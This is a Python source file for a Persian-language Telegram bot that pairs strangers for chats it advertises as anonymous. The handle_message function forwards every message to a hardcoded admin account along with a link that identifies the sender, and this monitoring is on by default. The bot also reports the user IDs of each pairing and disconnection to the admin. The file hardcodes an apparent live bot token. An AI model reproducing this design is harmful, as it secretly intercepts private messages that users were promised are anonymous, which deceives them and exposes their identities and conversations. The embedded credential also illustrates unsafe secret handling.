import logging
import json
import threading
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# --- تنظیمات اصلی ربات ---
TOKEN = "7689216297:AAHVucWhXpGlp15Ulk2zsppst1gDH9PCZnQ"
ADMIN_ID = 6929024145  # آیدی عددی شما به عنوان مدیر

# --- بخش وب سرور برای بیدار نگه داشتن ربات ---
app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is alive!"

def run_flask():
    """وب سرور را در یک پورت جداگانه اجرا می‌کند"""
    app.run(host='0.0.0.0', port=5000)

# --- برای لاگ‌گیری و دیباگ ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- متغیرهای وضعیت ---
user_partners = {}
waiting_pool = []
monitoring_enabled = True

# --- مراحل مکالمه برای ساخت پروفایل ---
NAME, GENDER, AGE = range(3)

# --- مدیریت فایل دیتابیس (JSON) ---
def load_user_data():
    """اطلاعات کاربران را از فایل JSON بارگیری می‌کند."""
    try:
        with open("users.json", "r", encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_user_data(data):
    """اطلاعات کاربران را در فایل JSON ذخیره می‌کند."""
    with open("users.json", "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

user_data = load_user_data()

# --- توابع اصلی ربات ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """دستور /start - نقطه شروع کار با ربات."""
    user_id = str(update.message.from_user.id)
    
    await update.message.reply_text(
        "🇮🇷 سلام! به «ایران‌گرام چت» خوش اومدی!\n\n"
        "اینجا می‌تونی به صورت ناشناس با یک نفر دیگه صحبت کنی.\n\n"
        "👇 برای شروع، یکی از گزینه‌ها رو انتخاب کن:",
        reply_markup=ReplyKeyboardMarkup(
            [["🔍 شروع چت", "👤 پروفایل من"]], resize_keyboard=True
        ),
    )
    
    if user_id not in user_data:
        await update.message.reply_text(
            "به نظر میاد پروفایلت کامل نیست. لطفاً با دستور /profile پروفایلت رو بساز."
        )

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """شروع فرآیند ساخت یا ویرایش پروفایل."""
    await update.message.reply_text(
        "خب، بیا پروفایلت رو بسازیم یا ویرایش کنیم.\n\n"
        "۱. اسمت چیه؟ (این اسم به طرف مقابل نمایش داده میشه)",
        reply_markup=ReplyKeyboardRemove(),
    )
    return NAME

async def received_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """دریافت نام و درخواست جنسیت."""
    context.user_data['name'] = update.message.text
    
    reply_keyboard = [["پسر", "دختر"]]
    await update.message.reply_text(
        "۲. جنسیتت چیه؟",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True),
    )
    return GENDER

async def received_gender(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """دریافت جنسیت و درخواست سن."""
    context.user_data['gender'] = update.message.text
    await update.message.reply_text("۳. چند سالته؟ (فقط عدد وارد کن)")
    return AGE

async def received_age(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """دریافت سن و ذخیره پروفایل."""
    user_id = str(update.message.from_user.id)
    try:
        age = int(update.message.text)
        if not 13 < age < 80:
            await update.message.reply_text("لطفاً یک سن معقول وارد کن. دوباره تلا کن.")
            return AGE
            
        user_data[user_id] = {
            "name": context.user_data['name'],
            "gender": context.user_data['gender'],
            "age": age,
        }
        save_user_data(user_data)
        
        await update.message.reply_text(
            "✅ پروفایل شما با موفقیت ذخیره شد!\n\n"
            "حالا با دکمه «🔍 شروع چت» می‌تونی یک هم‌صحبت پیدا کنی.",
            reply_markup=ReplyKeyboardMarkup(
                [["🔍 شروع چت", "👤 پروفایل من"]], resize_keyboard=True
            ),
        )
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("لطفاً سن را به صورت عدد وارد کن. دوباره تلاش کن.")
        return AGE

async def my_profile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """نمایش پروفایل کاربر."""
    user_id = str(update.message.from_user.id)
    if user_id in user_data:
        profile_info = user_data[user_id]
        await update.message.reply_text(
            f"👤 پروفایل شما:\n\n"
            f"🔹 نام: {profile_info['name']}\n"
            f"🔹 جنسیت: {profile_info['gender']}\n"
            f"🔹 سن: {profile_info['age']}\n\n"
            "برای ویرایش از دستور /profile استفاده کن."
        )
    else:
        await update.message.reply_text("شما هنوز پروفایلی نساخته‌اید! لطفاً از /profile استفاده کنید.")

async def search_partner(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """جستجو برای یک شریک چت."""
    user_id = update.message.from_user.id
    
    if str(user_id) not in user_data:
        await update.message.reply_text("❌ اول باید با دستور /profile پروفایلت رو بسازی!")
        return
        
    if user_id in user_partners or user_id in waiting_pool:
        await update.message.reply_text("شما در حال حاضر در یک چت یا در صف انتظار هستید! برای لغو از /next استفاده کن.")
        return

    waiting_pool.append(user_id)
    await update.message.reply_text("⏳ در حال جستجو برای یک هم‌صحبت... لطفاً صبر کن.")
    
    if len(waiting_pool) >= 2:
        user1_id = waiting_pool.pop(0)
        user2_id = waiting_pool.pop(0)
        
        user_partners[user1_id] = user2_id
        user_partners[user2_id] = user1_id
        
        profile1 = user_data[str(user1_id)]
        profile2 = user_data[str(user2_id)]
        
        await context.bot.send_message(user1_id, f"✅ یک هم‌صحبت پیدا شد!\n\n"
                                                 f"👤 پروفایل طرف مقابل: {profile2['name']}، {profile2['gender']}، {profile2['age']} ساله\n\n"
                                                 "می‌تونید صحبت کنید. برای پایان چت از /next استفاده کن.")
        await context.bot.send_message(user2_id, f"✅ یک هم‌صحبت پیدا شد!\n\n"
                                                 f"👤 پروفایل طرف مقابل: {profile1['name']}، {profile1['gender']}، {profile1['age']} ساله\n\n"
                                                 "می‌تونید صحبت کنید. برای پایان چت از /next استفاده کن.")
        
        await context.bot.send_message(ADMIN_ID, f"🔗 اتصال جدید: {user1_id} به {user2_id}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """مدیریت پیام‌های متنی بین کاربران."""
    user_id = update.message.from_user.id
    
    if user_id in user_partners:
        partner_id = user_partners[user_id]
        await context.bot.send_message(partner_id, update.message.text)
        
        global monitoring_enabled
        if monitoring_enabled:
            sender_profile = user_data.get(str(user_id), {"name": "ناشناس"})
            await context.bot.send_message(
                ADMIN_ID,
                f"💬 پیام از [{sender_profile['name']}](tg://user?id={user_id}):\n`{update.message.text}`",
                parse_mode='Markdown'
            )
    else:
        await update.message.reply_text("شما به کسی وصل نیستی. لطفاً از دکمه «🔍 شروع چت» استفاده کن.")

async def next_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """قطع چت فعلی یا لغو انتظار."""
    user_id = update.message.from_user.id
    
    if user_id in waiting_pool:
        waiting_pool.remove(user_id)
        await update.message.reply_text("جستجو لغو شد.")
        return

    if user_id in user_partners:
        partner_id = user_partners.pop(user_id)
        if partner_id in user_partners:
            user_partners.pop(partner_id)
        
        await context.bot.send_message(partner_id, "❌ طرف مقابل چت را ترک کرد. برای شروع یک چت جدید، از دکمه «🔍 شروع چت» استفاده کن.")
        await update.message.reply_text("شما چت را ترک کردید. برای شروع مجدد، از دکمه «🔍 شروع چت» استفاده کن.")
        await context.bot.send_message(ADMIN_ID, f"🔌 اتصال قطع شد: {user_id} و {partner_id}")
    else:
        await update.message.reply_text("شما در حال حاضر در چت نیستی.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """لغو فرآیند ساخت پروفایل."""
    await update.message.reply_text(
        "عملیات لغو شد.",
        reply_markup=ReplyKeyboardMarkup([["🔍 شروع چت", "👤 پروفایل من"]], resize_keyboard=True),
    )
    return ConversationHandler.END

# --- توابع مخصوص مدیر ---

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """ارسال آمار ربات برای مدیر."""
    if update.message.from_user.id != ADMIN_ID:
        return
        
    total_users = len(user_data)
    active_chats = len(user_partners) // 2
    waiting_users = len(waiting_pool)
    
    await update.message.reply_text(
        f"📊 آمار ربات:\n"
        f"👤 کل کاربران: {total_users}\n"
        f"💬 چت‌های فعال: {active_chats}\n"
        f"⏳ در صف انتظار: {waiting_users}"
    )

async def admin_monitor_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """فعال/غیرفعال کردن حالت مشاهده چت‌ها."""
    if update.message.from_user.id != ADMIN_ID:
        return
        
    global monitoring_enabled
    monitoring_enabled = not monitoring_enabled
    status = "فعال" if monitoring_enabled else "غیرفعال"
    await update.message.reply_text(f"👁️ حالت مشاهده چت‌ها اکنون {status} است.")


def main() -> None:
    """استارت و اجرای ربات و وب سرور."""
    
    # اجرای وب سرور در یک ترد (نخ) جداگانه تا ربات مسدود نشود
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()

    # ساخت اپلیکیشن ربات
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("profile", profile)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_name)],
            GENDER: [MessageHandler(filters.Regex("^(پسر|دختر)$"), received_gender)],
            AGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_age)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # ثبت دستورات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.Regex("^🔍 شروع چت$"), search_partner))
    application.add_handler(MessageHandler(filters.Regex("^👤 پروفایل من$"), my_profile))
    application.add_handler(CommandHandler("next", next_chat))
    application.add_handler(CommandHandler("cancel", cancel))
    
    # دستورات مدیر
    application.add_handler(CommandHandler("stats", admin_stats))
    application.add_handler(CommandHandler("monitor", admin_monitor_toggle))

    # ثبت مدیریت‌کننده پیام‌ها
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # اجرای ربات
    logger.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
